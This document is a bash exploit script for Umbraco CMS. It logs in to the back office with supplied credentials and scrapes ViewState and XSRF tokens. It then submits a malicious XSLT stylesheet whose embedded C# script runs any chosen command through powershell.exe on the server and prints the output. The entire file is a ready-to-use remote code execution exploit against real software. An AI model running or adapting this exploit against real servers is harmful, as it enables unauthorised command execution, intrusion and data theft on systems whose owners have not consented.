#!/bin/bash

# Dependency installation function
install_dependencies() {
    echo "[*] Checking and installing required dependencies..."
    for tool in curl awk sed grep tr; do
        if ! command -v $tool &> /dev/null; then
            echo "[!] $tool not found. Installing..."
            sudo apt update && sudo apt install -y $tool
        fi
    done
}

# Install missing dependencies
install_dependencies

# Check input arguments
if [ "$#" -ne 4 ]; then
    echo "Usage: $0 <username> <password> <target_url> <full_command>"
    exit 1
fi

USERNAME=$1
PASSWORD=$2
TARGET=$3
FULL_COMMAND=$4

# XSLT Payload
PAYLOAD='<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
<msxsl:script language="C#" implements-prefix="csharp_user">
public string xml() { 
  string cmd = "'$FULL_COMMAND'"; 
  System.Diagnostics.Process proc = new System.Diagnostics.Process();
  proc.StartInfo.FileName = "powershell.exe"; 
  proc.StartInfo.Arguments = "/c " + cmd; 
  proc.StartInfo.UseShellExecute = false; 
  proc.StartInfo.RedirectStandardOutput = true;  
  proc.Start(); 
  string output = proc.StandardOutput.ReadToEnd(); 
  return output; 
}  
</msxsl:script>
<xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> 
</xsl:stylesheet>'

echo "[*] Step 1 - Logging in..."
LOGIN_RESPONSE=$(curl -s -X POST -D - -H "Content-Type: application/json" \
    -d "{\"username\":\"$USERNAME\", \"password\":\"$PASSWORD\"}" \
    "$TARGET/umbraco/backoffice/UmbracoApi/Authentication/PostLogin")

COOKIES=$(echo "$LOGIN_RESPONSE" | grep -oP 'Set-Cookie: \K[^;]+' | tr '\n' '; ')
UMB_XSRF_TOKEN=$(echo "$COOKIES" | grep -oP 'UMB-XSRF-TOKEN=\K[^;]*')

if [[ -z "$COOKIES" || -z "$UMB_XSRF_TOKEN" ]]; then
    echo "[!] Login failed. Check credentials or debug_login_response.txt for details."
    exit 1
fi
echo "[+] Login successful!"

echo "[*] Step 2 - Accessing XSLT Visualize page..."
XS_RESPONSE=$(curl -s -H "Cookie: $COOKIES" "$TARGET/umbraco/developer/Xslt/xsltVisualize.aspx")

VIEWSTATE=$(echo "$XS_RESPONSE" | grep -oP '(?<=id="__VIEWSTATE" value=")[^"]*')
VIEWSTATEGENERATOR=$(echo "$XS_RESPONSE" | grep -oP '(?<=id="__VIEWSTATEGENERATOR" value=")[^"]*')

if [ -z "$VIEWSTATE" ] || [ -z "$VIEWSTATEGENERATOR" ]; then
    echo "[!] Failed to fetch necessary tokens."
    exit 1
fi
echo "[+] Successfully fetched tokens."

echo "[*] Step 3 - Sending malicious payload..."
ATTACK_RESPONSE=$(curl -s -H "Cookie: $COOKIES" \
    -H "UMB-XSRF-TOKEN: $UMB_XSRF_TOKEN" \
    --data-urlencode "__EVENTTARGET=" \
    --data-urlencode "__EVENTARGUMENT=" \
    --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VIEWSTATEGENERATOR" \
    --data-urlencode "ctl00\$body\$xsltSelection=$PAYLOAD" \
    --data-urlencode "ctl00\$body\$contentPicker\$ContentIdValue=" \
    --data-urlencode "ctl00\$body\$visualizeDo=Visualize+XSLT" \
    "$TARGET/umbraco/developer/Xslt/xsltVisualize.aspx")

# Save the response for debugging
echo "$ATTACK_RESPONSE" > debug_attack_response.html

# Extract the command output from <div id="result">
COMMAND_OUTPUT=$(echo "$ATTACK_RESPONSE" | awk 'BEGIN{IGNORECASE=1}/<div id="result">/,/<\/div>/' | sed 's/<[^>]*>//g' | tr -d '\r')

if [[ -n "$COMMAND_OUTPUT" ]]; then
    echo "[+] Payload executed successfully. Command Output:"
    echo -e "$COMMAND_OUTPUT"
else
    echo "[!] Exploit failed. Debugging recommended. Check debug_attack_response.html for details."
fi

echo "[*] Exploit completed."
